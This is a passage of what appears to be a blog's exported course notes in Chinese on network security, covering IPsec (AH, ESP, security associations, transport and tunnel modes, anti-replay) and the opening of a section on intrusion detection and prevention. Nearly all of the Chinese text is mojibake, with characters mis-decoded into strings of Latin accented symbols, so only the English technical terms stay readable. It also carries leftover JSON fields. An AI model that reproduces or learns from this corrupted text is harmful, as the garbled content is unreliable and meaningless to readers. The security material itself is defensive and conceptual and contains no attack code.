ä¿æŠ¤ç»è¿‡Internetçš„è¿œç¨‹è®¿é—®ï¼šç»ˆç«¯ç”¨æˆ·å¯ä»¥åˆ©ç”¨IP secåè®®æ¥é€šè¿‡ISPæ¥å‘å…¬å¸ç½‘ç»œå‘èµ·å…³åŸè®¿é—®è¯·æ±‚  ä¿æŠ¤ç»„ç»‡ä¹‹é—´çš„é€šä¿¡  åŠ å¼ºç”µå­å•†åŠ¡çš„å®‰å…¨æ€§ï¼šé€šè¿‡å¯¹ç½‘ç»œæµé‡çš„åŠ å¯†æ¥å¢å¼ºå®‰å…¨æ€§   ä½¿ç”¨åœºæ™¯ IPSecæ—¢å¯ä»¥å®‰è£…åœ¨ç»„ç»‡çš„ç½‘ç»œè®¾å¤‡ä¸Šï¼Œä¾‹å¦‚router or firewallä½œä¸ºå†…å¤–ç½‘çš„gateæ¥å¯¹è¿›å‡ºçš„æ•°æ®è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ï¼Œä¹Ÿå¯ä»¥å®‰è£…åœ¨ä¸»æœºç»ˆç«¯ä¸Šæ¥ä¿æŠ¤å…¶å¯¹å¤–ç½‘çš„é€šä¿¡ã€‚  Benefits  å°†IPSecéƒ¨ç½²åœ¨firewall \u0026amp; routerä¸Šçš„æ—¶å€™ï¼Œå¯ä»¥å‡è½»å…¬å¸ä¼ä¸šå¯¹äºå®‰å…¨æªæ–½çš„ç¹é‡è´Ÿæ‹…ï¼Œåªéœ€è¦å…¨éƒ¨äº¤ç»™è¿™äº›ç½‘ç»œè®¾å¤‡ç»Ÿä¸€å¤„ç†å°±å¥½äº†  å¹¶ä¸”firewallä¸Šçš„IPsecå¯ä»¥æœ‰æ•ˆçš„é˜²å¾¡ç»•è¿‡ï¼Œå› ä¸ºå¤–ç•Œæ¥çš„æµé‡éƒ½éœ€è¦ä½¿ç”¨IPSecå¹¶ä¸”æ— å¤„å¯é€ƒ  IPSecä½äºä¼ è¾“å±‚ä¸‹é¢ï¼Œå› æ­¤å¯¹äºåº”ç”¨æ¥è¯´æ˜¯é€æ˜çš„  ä¸éœ€è¦ä¿®æ”¹è½¯ä»¶    å¯¹ç”¨æˆ·ä¹Ÿæ˜¯é€æ˜çš„ï¼Œä¸è¿‡ä¸€èˆ¬æ¥è¯´ç”¨æˆ·ä¹Ÿä¸ä¼šå¯Ÿè§‰åˆ°IPSecçš„å­˜åœ¨ï¼Œä¸€åˆ‡éƒ½æ˜¯é»˜é»˜è¿›è¡Œçš„  æœ‰éœ€è¦çš„è¯ä¹Ÿå¯ä»¥ç§ç”¨ä¿æŠ¤å•ç‹¬çš„ç”¨æˆ·   IPsec standard IPsec æä¾›ä¸‰ç§protocolsæ¥å®Œæˆä¸åŒçš„ä»»åŠ¡  Authentication Header (AH)ï¼šä¿æŠ¤IPæ•°æ®åŒ…çš„integrity and authenticityï¼ˆä½†æ˜¯ä¸åŒ…æ‹¬ confidentialityï¼‰  Encapsulating Security Payload (ESP)ï¼šä¿æŠ¤confidentialityï¼Œä¹Ÿå¯ä»¥é€‰æ‹©æ€§çš„ä¿æŠ¤integrity  Internet Key Exchange Protocol (IKE): æä¾›å¯†é’¥ç®¡ç†   IPsec services  IPsecå¯ä»¥é€šè¿‡é€‰æ‹©å®ç°ä¸åŒçš„protocolæ¥å®ç°ä¸åŒçš„services IPsec policy IPsec policyä¸»è¦æ˜¯é€šè¿‡ç›´æ¥ä¸IP packetè¿›è¡Œäº’åŠ¨ï¼Œè€Œå…·ä½“çš„policyå†…å®¹åˆ™éœ€è¦è®¿é—®ä¸¤ä¸ªæ•°æ®åº“ï¼š  Security association database (SAD)  Security policy database (SPD)   Security association database (SAD)  Security association (SA)  SAæ˜¯ä¸€ä¸ªSADä¸­çš„å…³é”®  å…¶æ˜¯ä¸€ä¸ª å•å‘ çš„æ¦‚å¿µï¼Œä»¥ä¸ºç€ä¸€å¯¹é€šä¿¡çš„åŒæ–¹çš„å•å‘è¡Œä¸ºéœ€è¦å•ç‹¬çš„SAè¿›è¡Œå®šä¹‰  å…¶ä¸­æ¯ä¸€ä¸ªSAç”±ä¸‰ä¸ªå‚æ•°è¿›è¡Œæ ‡è¯†ï¼š  Security Parameters Index (SPI): æ–¹ä¾¿ä½¿ç”¨çš„ç³»ç»Ÿæ¥æ ‡è¯†SA  IP Destination Address: ä¹‹å‰æˆ‘ä»¬æåˆ°çš„â€œå•å‘â€å°±ä½“ç°åœ¨æ­¤ï¼Œé€šè¿‡destination addressæ¥è¿›è¡Œæ ‡è¯†  Security Protocol Identifier: æ ‡è¯†é€‰æ‹©AHè¿˜æ˜¯ESP       æ‰€æœ‰SAçš„å®šä¹‰éƒ½ä¼šæ”¾åœ¨ä¸€ä¸ªæŒ‡å®šçš„Security Association Databaseä¸­   AH   ESP   Keys   Key lifetimes   Lifetime of security association   Protocol mode (tunnel or transport)    Security policy database (SPD) SPDä¸»è¦å®šä¹‰äº†é‚£äº›IP trafficå°†ä¸é‚£äº›SAè¿›è¡Œé…åˆä½¿ç”¨ï¼ˆæˆ–è€…ä¸ä½¿ç”¨ï¼‰ï¼Œé€šå¸¸æ¥è¯´ä½¿ç”¨entryæ¥è¿›è¡Œè®°å½•ï¼š  a subset of IP traffic : an SA for that traffic   åœ¨å¤æ‚çš„ç¯å¢ƒä¸­ï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªçš„entrieså¯¹åº”ä¸€ä¸ªSAæˆ–è€…æ˜¯å¤šä¸ªSAéœ€è¦åº”ç”¨åœ¨ä¸€ä¸ªSPD entryä¸Š  IP traffic processing IPsecæ˜¯ä¸€ä¸ªåŒ…ä¸€ä¸ªåŒ…çš„æ‰§è¡Œè¿‡æ¥çš„  æ¯ä¸ªå‡ºç«™çš„IP packetåœ¨å‘å‡ºå»ä¹‹å‰éƒ½éœ€è¦ç”¨IPsecè¿›è¡Œå¤„ç†  æ¯ä¸€ä¸ªå…¥ç«™çš„åŒ…åœ¨æ”¶åˆ°ä¹‹åéƒ½éœ€è¦è¢«IPsecè¿›è¡Œå¤„ç†ï¼Œç„¶åæ‰èƒ½ä¼ è¾¾çš„æ›´é«˜å±‚è¿›è¡Œä¸‹ä¸€æ­¥å¤„ç†(TCP/UDP)   Outbound packets   æ”¶åˆ°ä¸€ä¸ªoutbound packetä¹‹åï¼ŒIPsecä¼šä»SPDä¸­åŒ¹é…entries  å¦‚æœæ²¡æœ‰åŒ¹é…ä¸Šï¼Œé‚£ä¹ˆå°±ä¼šç›´æ¥è¢«ä¸¢å¼ƒå¹¶äº§ç”Ÿé”™è¯¯ä¿¡æ¯  å¦‚æœåŒ¹é…ä¸Šäº†ï¼Œé‚£ä¹ˆå°±ä¼šå†³å®špacketçš„å»å¤„ï¼Œå¯èƒ½æ˜¯â€œä¸¢å¼ƒâ€ï¼Œä¹Ÿå¯èƒ½ç›´æ¥ç»•è¿‡IPsecï¼ˆå°±æ˜¯æˆ‘ä»¬ä¹‹å‰è¯´çš„æ²¡æœ‰SAï¼‰  å¦‚æœpolicyæ˜¯PROTECTçš„è¯ï¼Œå°±å»SADä¸­å¯»æ‰¾åŒ¹é…çš„entryï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°çš„è¯ï¼Œ IKE å°±ä¼šè¢«è°ƒç”¨æ¥åˆ›é€ ä¸€ä¸ªæ–°çš„SAä»¥åŠåˆé€‚çš„å¯†é’¥  å¦‚æœSADä¸­åˆåŒ¹é…çš„entryï¼Œé‚£ä¹ˆå°±ä¼šæŒ‰ç…§SAè¿›è¡Œå¤„ç†ï¼Œæœ€ç»ˆå‘é€å‡ºå»   Inbound Packets   IPsecé¦–å…ˆæŸ¥çœ‹IP packetçš„headeræ¥å†³å®šç€æ˜¯ä¸€ä¸ªä¸å®‰å…¨çš„IP packetè¿˜æ˜¯å·²ç»æœ‰IPsecä¿æŠ¤çš„ï¼ˆESP or AH headersï¼‰  å¦‚æœIP packetæ˜¯ä¸å®‰å…¨çš„ï¼Œé‚£ä¹ˆIPsecå°±ä¼šä»SPDä¸­å¯»æ‰¾åŒ¹é…çš„entryï¼Œå¦‚æœç¬¬ä¸€ä¸ªåŒ¹é…åˆ°çš„policyæ˜¯BYPASSï¼Œé‚£ä¹ˆå°±ç›´æ¥å‘åˆ°TCP/UDPå»å¤„ç†äº†ï¼Œå¦‚æœæ˜¯å…¶ä»–çš„ï¼Œä¾‹å¦‚PROTECT or DISCARDæˆ–è€…æ²¡æœ‰åŒ¹é…åˆ°ï¼Œé€šé€šéƒ½ä¸¢å¼ƒï¼Œå› ä¸ºæ˜¯ä¸å®‰å…¨çš„  å¦‚æœæ˜¯å®‰å…¨çš„IPSecåŒ…ï¼Œé‚£ä¹ˆå°±ç›´æ¥å»SADä¸­æ‰¾å¯¹åº”çš„entriesä»¥åŠSAï¼Œæ¥ç€å¦‚æœåŒ¹é…åˆ°äº†ï¼Œé‚£å°±æ‰§è¡Œå¯¹åº”çš„æ“ä½œ(AH/ESP)ï¼Œæ²¡æœ‰åŒ¹é…åˆ°çš„è¯å°±ç›´æ¥ä¸¢å¼ƒ   Authentication Header (AH) è¿™ä¸€ç« ä¸­ï¼Œæˆ‘ä»¬å…·ä½“æ¥çœ‹ä¸€ä¸‹AHçš„ç»„æˆç»“æ„ AHä½œä¸ºä¸€ä¸ªé¢å¤–çš„headerï¼Œå…¶å¤¹åœ¨IP \u0026amp; TCP headerä¹‹é—´ï¼Œæä¾›è¶³å¤Ÿçš„ä¿¡æ¯æ¥è¯†åˆ«SAï¼Œå…¶åªæä¾› Integrity çš„ä¿éšœ  Security Parameters Index (SPI): æ–¹ä¾¿ä½¿ç”¨çš„ç³»ç»Ÿæ¥æ ‡è¯†SA  IP Destination Address: ä¹‹å‰æˆ‘ä»¬æåˆ°çš„â€œå•å‘â€å°±ä½“ç°åœ¨æ­¤ï¼Œé€šè¿‡destination addressæ¥è¿›è¡Œæ ‡è¯†  Security Protocol Identifier: æ ‡è¯†é€‰æ‹©AHè¿˜æ˜¯ESP  Sequence number fieldä¼šä»1å¼€å§‹ä¸æ–­å¢åŠ ï¼Œ   Anti-relay service relay attackå°±æ˜¯æ”»å‡»è€…é€šè¿‡é‡å¤ä½¿ç”¨å¯ä»¥é€šè¿‡è®¤è¯çš„æ•°æ®åŒ…æ¥è¿›è¡Œç»•è¿‡ å‡è®¾æˆ‘ä»¬ä½¿ç”¨è¿™æ ·ä¸€ä¸ªSA  å‘é€è€…ï¼š  å°†sequence numberè®¡æ•°å™¨è®¾ç½®ä¸º0  æ¯ä¸€ä¸ªpacketçš„sequence numberè¿›è¡Œé€’å¢  å¦‚æœè¾¾åˆ°ä¸Šé™ï¼ˆ2^32 - 1ï¼‰,å°±ç»“æŸå½“å‰è¿™ä¸ªSAï¼Œå¹¶é‡æ–°å¼€å¯ä¸€ä¸ªSAå’Œæ–°çš„å¯†é’¥è¿›è¡ŒåŠ å¯†   æ¥æ”¶è€…ï¼Œè®¾ç½®ä¸€ä¸ª window size W (default = 64)  å¦‚æœæ¥æ”¶åˆ°ä¸€ä¸ªæ•°æ®åŒ…çš„sequence numberè½åˆ°window sizeä¸­ï¼Œå¹¶ä¸” Integrity æ£€æŸ¥ä¹Ÿæ²¡æœ‰é—®é¢˜ï¼Œå°±æ ‡è®°ä¸ºvalid  å¦‚æœæ¥æ”¶åˆ°ä¸€ä¸ªæ•°æ®åŒ…è½åœ¨çª—å£å³è¾¹ï¼ˆæœªæ¥çª—å£çš„æ•°æ®åŒ…ï¼‰ï¼ŒåŒæ—¶Integrity æ£€æŸ¥ä¹Ÿæ²¡æœ‰é—®é¢˜ï¼Œæ ‡è®°ä¸ºvalidï¼ŒåŒæ—¶çª—å£å‘å³æ»‘åŠ¨  å¦‚æœæ¥æ”¶åˆ°çš„æ•°æ®åŒ…è½åœ¨çª—å£å·¦è¾¹ï¼ˆä»¥å‰çš„æ•°æ®åŒ…ï¼‰æˆ–è€…è®¤è¯å¤±è´¥ï¼Œé‚£ä¹ˆpacketä¼šè¢«ä¸¢å¼ƒï¼ŒåŒæ—¶è®°å½•è¯¥äº‹ä»¶   é€šè¿‡sequence numberå°±å¯ä»¥æœ‰æ•ˆåˆ¤æ–­æ•°æ®åŒ…æ˜¯å¦æ˜¯ä»¥å‰çš„è¢«æ”»å‡»è€…ç”¨åœ¨ç°åœ¨çš„æ•°æ®æµä¸Š AH modes åŸå§‹çš„TCP segment    Transport mode\n  AHæ’å…¥åœ¨IP headerä¸TCP headerä¹‹é—´   MAC (Message Authentication Code)ä¼šå¯¹æ•´ä¸€ä¸ªåŒ…è¿›è¡Œè®¤è¯   æä¾›ç«¯å¯¹ç«¯çš„IPsecç³»ç»Ÿä¿æŠ¤        Tunnel mode\n æ•´ä¸ªåŸå§‹æ•°æ®åŒ…éƒ½ä¼šè¢«è¿›è¡ŒéªŒè¯ï¼Œä¼šæœ‰ä¸€ä¸ªæ–°çš„ outer IP header  inner(original) IP headerä¸­æºå¸¦æœ€ç»ˆçš„ source/destination address  new outer header åŒæ ·ä¹Ÿä¼šæ”¶åˆ°ä¿æŠ¤ï¼Œä½†æ˜¯åŒ…å«çš„æ˜¯ä¾‹å¦‚firewall/security gatewayçš„åœ°å€      Encapsulating Security Payload (ESP) ESPå¯ä»¥æä¾›confidentiality, data origin authentication, connectionless integrity, an anti-replay service, and traffic flow confidentiality.  ESP header æŒ‡å®šäº†åŠ å¯†çš„ç®—æ³•ä»¥åŠauthenticationç­–ç•¥ ESP mode   Transport Mode ESP\nTransport Mode ESP ä¸€èˆ¬ç«¯å¯¹ç«¯çš„å®‰å…¨é€šä¿¡ä¸Šï¼Œå¯ä»¥å¯¹IPæ•°æ®åŒ…è¿›è¡ŒåŠ å¯†å’Œè®¤è¯ã€‚   å¯¹äºIPv4æ•°æ®åŒ…ï¼ŒIPsecä¸€æ—¦ä»‹å…¥ï¼š  ESP headerä¼šæ’å…¥IP headerå’ŒTCP headerä¹‹é—´  åŒæ—¶ESP trailer (including Padding, Pad length, and Next Header fields) å°†ä¼šè¢«æ·»åŠ åœ¨IP packetçš„æœ€å  å¦‚æœæ·»åŠ äº†è®¤è¯çš„é€‰é¡¹ï¼Œé‚£ä¹ˆåœ¨æœ€åè¿˜ä¼šåŠ ä¸Š ESP Authentication Data, è¿™æ—¶å¯¹å‰é¢æ‰€æœ‰å†…å®¹çš„åŠ å¯†     è¿™é‡Œè¡¥å……ä¸€ä¸‹Paddingçš„ä½œç”¨ï¼Œä¸»è¦æ˜¯å½“åŠ å¯†ç®—æ³•éœ€è¦è§„å®šæ•°é‡çš„bytesçš„æ—¶å€™ï¼Œç”±äºåŸæ¥çš„å†…å®¹ä¸å¤Ÿbytesæ•°ï¼Œå°±éœ€è¦æ·»åŠ ä¸€äº›å†…å®¹æ¥å‡‘é½ï¼Œè¿™äº›å°±ä¼šæ”¾åœ¨ESP traileré‡Œé¢  å¯¹äºIPv6çš„æ•°æ®åŒ…ï¼š  åœ¨IPv6ä¸­ï¼ŒESPä¼šè¢«å½“ä½œæ˜¯ç«¯å¯¹ç«¯çš„payloadï¼Œå› æ­¤æ— æ³•è¢«ä¸»åŠ¨çš„è·¯ç”±ï¼Œå› æ­¤å°±éœ€è¦é™„å¸¦ä¸Šå…·ä½“çš„è·¯ç”±åœ¨headerä¸Šé¢  hop-by-hopè·¯ç”±ä¼šè¢«æ·»åŠ åœ¨Original IP headerä¸ESP headerä¹‹é—´       æ€»çš„æ¥è¯´Transport modeçš„æ“ä½œä¸»è¦æ˜¯ï¼š  ä¼ è¾“çš„æ•°æ®å†åŠ ä¸ŠESP trailerä¸­paddingçš„æ•°æ®å’Œæ•´ä¸€ä¸ªTransport-layers segment (e.g., TCP segment)ä¸€èµ·è¢«åŠ å¯†å¹¶å°†åŸæœ¬çš„æ˜æ–‡dataæ¢æˆæ˜¯ç»è¿‡åŠ å¯†çš„æ•°æ®ã€‚æ˜¯å¦å¼€å¯è®¤è¯å¯ä»¥è‡ªç”±é€‰æ‹©  æ•°æ®åŒ…è¢«è·¯ç”±åˆ°destinationï¼Œæ‰€æœ‰ç»è¿‡çš„è·¯ç”±å™¨éƒ½ä¼šå¤„ç†IP headerä¸­çš„å†…å®¹ï¼Œä½†æ˜¯ä¸éœ€è¦ä¹Ÿä¸èƒ½å¤„ç†åŠ å¯†çš„å¯†æ–‡  destination nodeæ ¹æ®ESP headerä¸­çš„SPIé€‰æ‹©SAæ¥è§£å¯†ï¼Œå¹¶æ¢å¤åŸæœ¬çš„Transport-layers segment (e.g., TCP segment).   Transport modeçš„å¥½å¤„åœ¨äºæä¾›äº†ç»Ÿä¸€çš„confidentialityï¼Œè€Œä¸éœ€è¦æ¯ä¸€ä¸ªapplicationè¿˜éœ€è¦å®ç°è‡ªå·±çš„åŠ å¯†. ä½†æ˜¯æœ‰ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯ï¼Œè·¯ä¸Šçš„è·¯ç”±å™¨è¿˜æ˜¯å¯ä»¥å¯¹æµé‡è¿›è¡Œåˆ†æï¼Œè¿™ç‚¹æ— æ³•é˜»æ­¢ã€‚     Tunnel mode ESP\nå¦‚ä¸‹å›¾å°±æ˜¯Tunnel modeçš„ä¸€ä¸ªä½¿ç”¨åœºæ™¯ï¼Œæ¯ä¸ªå…¬å¸çš„å†…ç½‘é€šè¿‡tunnel mode å»ºç«‹çš„VPNè¿›è¡Œäº’ç›¸çš„é€šä¿¡ï¼Œè€Œå®Œæˆä¸å’ŒInternetçš„è·¯ç”±ä¸Šçš„ä»»ä½•å…¶ä»–ä¸»æœºæˆ–è€…è®¾å¤‡è¿›è¡Œäº¤äº’ã€‚  é‚£ä¹ˆä¸ºäº†é¿å…æ²¿è·¯çš„è·¯ç”±å™¨å¯¹é€šä¿¡è¿›è¡Œæµé‡åˆ†æï¼ŒTunnel mode ESPå°†ä¼šåŠ å¯†æ•´ä¸€ä¸ªIP packetï¼Œç„¶åå°† ESP header åŠ åœ¨ Original IP header å‰é¢ ç”±äºOriginal IP headerä¸­åŒ…å«ç›®æ ‡åœ°å€ä»¥åŠroutingçš„ä¿¡æ¯ï¼Œå› æ­¤ä¸€æ—¦å…¨éƒ¨è¢«åŠ å¯†ä¹‹åï¼Œé€”å¾„çš„è·¯ç”±å™¨å°±æ— æ³•å¤„ç†è¿™äº›æ•°æ®åŒ…ã€‚å› æ­¤å°±éœ€è¦ä¸€ä¸ªæ–°çš„IP headerï¼Œå…¶ä¸­åŒ…å«å¿…è¦çš„ä¿¡æ¯ï¼Œä½†æ˜¯ä¸èƒ½è¢«è¿›è¡Œæµé‡åˆ†æ åŒæ—¶ï¼Œä¸ºäº†ä¿æŠ¤å†…ç½‘çš„ä¸»æœºï¼ŒESPä¼šæä¾›å†…ç½‘çš„è¾¹ç•Œè®¾å¤‡ï¼Œä¾‹å¦‚firewall or security gateway  æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªå…·ä½“çš„ä¾‹å­ï¼Œçœ‹çœ‹ä¸€ä¸ªå¤–ç½‘çš„ä¸»æœºæ˜¯å¦‚ä½•é€šè¿‡Tunnel mode ESPæ¥ä¸å†…ç½‘ä¸»æœºè¿›è¡Œé€šä¿¡çš„   æ„å»ºä¸€ä¸ªå®‰å…¨çš„ outer IP packet:  é¦–å…ˆæ„é€ ä¸€ä¸ªoriginal IP packetå…¶ä¸­åŒ…å«äº†å†…ç½‘ç”¨æˆ·çš„ä¿¡æ¯  ç„¶åæ·»åŠ ä¸€ä¸ª ESP header  æ¥ç€åŠ ä¸Š ESP trailer æ¥paddingä¸Šåˆé€‚çš„ä¿¡æ¯ç”¨äºåŠ å¯†ç®—æ³•ï¼Œæ¥ç€å°†åŸæœ¬çš„dataä»¥åŠ ESP trailer åŠ å¯†ï¼Œå¹¶åœ¨æœ«å°¾æ·»åŠ ä¸Šè®¤è¯çš„ä¿¡æ¯ ESP authentication  æœ€åå†æœ€å‰é¢åŠ ä¸Šä¸€ä¸ªæ–°çš„ new IP header ï¼ˆå¦‚æœæ˜¯IPv6çš„è¯è¿˜è¦åŠ ä¸Š hop-by-hop options ï¼‰     æ¥ç€è¿™ä¸ª outer packet å°†ä¼šè¢«è·¯ç”±åˆ°ç›®æ ‡çš„é˜²ç«å¢™ï¼Œé€”å¾„çš„è·¯ç”±å™¨åªèƒ½å¤„ç†æœ€å¤–é¢çš„æ–°çš„IP headerä»¥åŠæ‰©å±•çš„headersï¼Œä½†æ˜¯æ— æ³•å¤„ç†ä¸­é—´åŠ å¯†çš„ä¿¡æ¯   Destination firewallä¹Ÿä¼šå…ˆå¤„ç†å¤–éƒ¨çš„å‡ ä¸ªheadersï¼Œä¹‹åä¾¿ä¼šæ ¹æ® ESP headerä¸­çš„ SPI ä¿¡æ¯æŸ¥æ‰¾å¯¹åº”çš„SAæ¥è¿›è¡Œè§£å¯†ï¼Œæœ€ç»ˆåœ¨å†…ç½‘ä¸­è¿›è¡Œè·¯ç”±ï¼Œä¼ é€’åˆ°æŒ‡å®šçš„ä¸»æœºä¸Š      Combining security associations ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªSAåªä¼šå®ç°AH or ESPå…¶ä¸­ä¸€ä¸ªprotocol,æ— æ³•éƒ½å®ç°ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡æœ‰ä¸€ç§ç”¨æ³•æ˜¯ä¸€ä¸ªæ•°æ®æµå¯¹åº”å¾ˆå¯¹ä¸ªSAsæ¥ç»„æˆIPsec services, è¿™ç§å¾ˆå¤šSAsä¸€èµ·ä½¿ç”¨çš„å°±å«åš security association bundle refers ä¸€èˆ¬æ¥è¯´ï¼Œç»¼åˆçš„ä½¿ç”¨æ–¹æ³•æœ‰ä¸¤ç§ï¼š  Transport adjacency  å°†å¤šç§å®‰å…¨åè®®è¿ç”¨åœ¨ç”¨ä¸€ç§IP packetä¸Šè€Œä¸æŒ‘ç”¨éš§é“    Iterated tunneling:  å°†å¤šå±‚çš„å®‰å…¨åè®®è¿ç”¨åœ¨IP tunnelingä¸Š     Case study   Case 1\n ç«¯å¯¹ç«¯çš„å®‰å…¨ï¼ˆé€šè¿‡äº¤æ¢å¯†é’¥ï¼‰ ä¸€èˆ¬ä¸ºå†…ç½‘çš„ä¸»æœºè®¿é—®å¤–ç½‘çš„æœåŠ¡å™¨æä¾›ä¿æŠ¤ å¯èƒ½çš„ç»„åˆ  AH in transport mode  ESP in transport mode  ESP followed by AH in transport model (an ESP SA inside an AH SA)  Any of the above inside an AH or ESP in tunnel mode       Case 2\nåªæä¾›gateway (routers, firewall, etc.)ä¹‹é—´çš„å®‰å…¨é€šä¿¡ï¼Œä¸»æœºä¸éœ€è¦å®ç°IPSecï¼Œå› æ­¤åœ¨security gatewayä¹‹åçš„ç½‘ç»œä¸­ä¸æä¾›ä»»ä½•ä¿æŠ¤ VPNå°±æ˜¯å…¶ä¸­ä¸€ç§åº”ç”¨ åŒæ—¶é‡‡ç”¨IP tunnelingï¼Œå¯ä»¥ç”¨ä»¥ä¸‹æ–¹å¼å®ç°ï¼š  AH  ESP  ESPåŠ ä¸Šauthenticationé€‰é¡¹ï¼ˆAHæ˜¯æ²¡æœ‰çš„ï¼‰        Case 3\nCase3å¯ä»¥è¢«çœ‹ä½œæ˜¯Case 1 åŠ ä¸ŠCase2ï¼Œå³åœ¨Case2çš„IP tunnelingæ‰€æä¾›çš„ security gatewaysä¹‹é—´çš„ä¿æŠ¤çš„åŸºç¡€ä¸Šï¼ŒåˆåŠ ä¸Šäº†case1ä¸­çš„ç‚¹å¯¹ç‚¹çš„ä¿æŠ¤æªæ–½ï¼Œé€šè¿‡æä¾›ç«¯å¯¹ç«¯çš„SAsç»„åˆæ¥å®ç°å†…ç½‘ä¸­çš„ä¿æŠ¤      Case 4\nä½¿ç”¨åœºæ™¯ä¸€èˆ¬æ˜¯å¤–ç½‘çš„ä¸»æœºéœ€è¦è®¿é—®åœ¨security gatewayä¸­æ‰€ä¿æŠ¤çš„å†…ç½‘ä¸­çš„ä¸»æœº  è¿œç¨‹ä¸»æœºä¼šä¸security gatewayä¹‹é—´å»ºç«‹ IP tunneling  åŒæ—¶security gatewayä¹Ÿä¼šä¸å†…ç½‘çš„ä¸»æœºå»ºç«‹SAsçš„ä¿æŠ¤      ","date":"2022-05-29T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_8_ip_security/","title":"NSE Week 8: IP security"},{"content":"NSE Week 7: Intrusion detection and prevention IDPS IDPS vs firewall Why we need Intrusion detection since we already have firewalls?   IDSçš„ä¸»è¦ç›®çš„æ˜¯æ£€æµ‹å¹¶æŠ¥å‘Šä»»ä½•ç½‘ç»œä¸­çš„å…¥ä¾µå°è¯•   IDSæ˜¯å»ºç«‹åœ¨firewallä¹‹åçš„ï¼Œè¿˜è®°å¾—æˆ‘ä»¬ä¹‹å‰åœ¨firewallä¸­æåˆ°çš„ä¸‰å±‚å†…ç½‘ä¿æŠ¤æœºåˆ¶å—ï¼ŒIDSå°±ä½œä¸ºè¡—é“å·¡é€»æ¥è¯†åˆ«å¯ç–‘çš„å…¥ä¾µè€…   Firewallä¸»è¦æ˜¯å°†å¤–æ•ŒæŠµå¾¡åœ¨åŸå¢™ä¹‹å¤–ï¼Œè€ŒIDSå°±è´Ÿè´£æŠ“ä½æ½œä¼è¿›æ¥çš„å†…é¬¼    Three classes of intruders  Masquerader ä¼ªè£…è€… Masqueraderæ˜¯ä¸€ä¸ªå¤–éƒ¨äººå‘˜ï¼Œæ²¡æœ‰ä»»ä½•æƒé™æ¥ä½¿ç”¨è®¡ç®—æœºï¼Œä½†æ˜¯å´é€šè¿‡å¤–éƒ¨æ‰‹æ®µè¿›è¡Œæ¸—é€ï¼Œæ“æ§äº†åˆæ³•ç”¨æˆ·çš„è´¦æˆ·ï¼Œå¯ä»¥è¢«çœ‹ä½œæ˜¯ä¸€ä¸ªoutsider  Misfeasor æ¸èŒè€… Misfeasoræ˜¯ä¸€ä¸ªåˆæ³•çš„ç”¨æˆ·ï¼Œä½†æ˜¯å´åšäº†è¶…å‡ºå…¶æƒé™æ´»ç€è§„å®šçš„äº‹æƒ…ï¼Œå¯ä»¥è¢«çœ‹ä½œæ˜¯ä¸€ä¸ªinsider  Clanderstine user ç§˜å¯†ç”¨æˆ· Clanderstine useré€šè¿‡è·å–è·å–ç³»ç»Ÿçš„é«˜çº§æƒé™ï¼Œè¿›è€Œç ´åç³»ç»Ÿçš„é˜²å¾¡æªæ–½ï¼Œå¯ä»¥æ˜¯insideræ´»ç€outsider   IDPS Definitions  Intrusion  æœªç»æˆæƒçš„å¯¹äºè®¡ç®—æœºèµ„æºçš„è®¿é—®    Intrusion detection  æ£€æµ‹å¯¹äºç³»ç»Ÿæ´»ç€ç½‘ç»œæœªç»æˆæƒçš„è®¿é—®    Intrusion detection system (IDS)   å°±åƒæ˜¯ç½‘ç»œä¸­çš„æ€æ¯’è½¯ä»¶   ç»„æˆï¼šsensors, alerts; æ£€æµ‹å¦‚å‰ä»¥åŠæŠ¥å‘Šæ£€æµ‹åˆ°çš„å¦‚å‰    Intrusion prevention system (IPS)  IPS å°±æ˜¯ä¸€ä¸ªIDSå¹¶ä¸”è‡ªåŠ¨å¯¹æ£€æµ‹åˆ°çš„å…¥ä¾µåšå‡ºåé¦ˆçš„ç³»ç»Ÿï¼š  å…³é—­å…¥ä¾µè€…çš„ç½‘ç»œè¿æ¥  å°è¯•åæº¯æºå…¥ä¾µè€…  å¯¹æŠ—æ”»å‡»       IDSä¸IPSé…åˆä½¿ç”¨ï¼Œä¸€èˆ¬æ¥è¯´IDSåœ¨IPSçš„åé¢è¾…åŠ©å…¶æ›´å¥½çš„åŠ å¼ºå®‰å…¨ Approaches to intrusion detection é‚£æˆ‘ä»¬å…·ä½“åº”è¯¥å¦‚ä½•è¯†åˆ«ä¸€æ¬¡å…¥ä¾µå‘¢ï¼Ÿ  æœ€åŸºç¡€çš„æ–¹æ³•å°±æ˜¯å¯†åˆ‡ç›‘æ§æ‰€æœ‰åˆæ³•ç”¨æˆ·çš„è¡Œä¸ºï¼Œä¸€æ—¦å‡ºç°å¼‚å¸¸çš„è¡Œä¸ºï¼Œå°±å¾ˆæœ‰å¯èƒ½æ˜¯ä¸€æ¬¡å…¥ä¾µ   ä½†æ˜¯å…¥ä¾µè¡Œä¸ºå´å’Œæ™®é€šçš„è¡Œä¸ºæœ‰å¾ˆå¤§çš„é‡å   å› æ­¤æ£€æµ‹å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°é—®é¢˜ï¼Œæˆ‘ä»¬ç”¨machine learningä¸­æ›¾ç»ç”¨è¿‡çš„æ¦‚å¿µæ¥è§£é‡Šå…¥ä¾µæ£€æµ‹ å‰æï¼šåœ¨è¿™é‡Œï¼Œä¸€æ¬¡positiveå°±è¡¨ç¤ºï¼ŒIDSè¯†åˆ«äº†ä¸€æ¬¡intrusion   False positive å°±æ˜¯è¡¨ç¤ºä¸€ä¸ªæˆæƒçš„ç”¨æˆ·çš„æ­£å¸¸è¡Œä¸ºè¢«é”™è¯¯çš„è®¤ä¸ºæ˜¯äº†å…¥ä¾µï¼Œæ£€æµ‹æ¡ä»¶è¾ƒä¸ºå®½æ¾çš„IDSæ›´å®¹æ˜“æ£€æµ‹åˆ°æ›´å¤šçš„å…¥ä¾µï¼Œä½†åŒæ—¶ä¹Ÿä¼šé­è‡´å¾ˆå¤šçš„false alarms, completeness   False negative 